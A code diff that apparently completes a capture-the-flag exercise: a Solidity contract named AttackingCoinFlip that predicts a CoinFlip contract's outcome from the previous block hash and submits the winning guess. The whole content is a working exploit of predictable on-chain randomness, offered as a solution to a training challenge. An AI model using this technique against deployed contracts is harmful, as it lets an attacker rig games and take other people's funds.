@@ -5,11 +5,22 @@ import "./CoinFlip.sol";
 contract AttackingCoinFlip {
     address public contractAddress;
 
+    uint256 private constant FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
     constructor(address _contractAddress) {
         contractAddress = _contractAddress;
     }
 
     function hackContract() external {
         // Code me!
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+
+        uint256 flip = blockValue / FACTOR;
+        bool side = flip == 1 ? true : false;
+
+        CoinFlip coinFlip = CoinFlip(contractAddress);
+
+        coinFlip.flip(side);
     }
 }
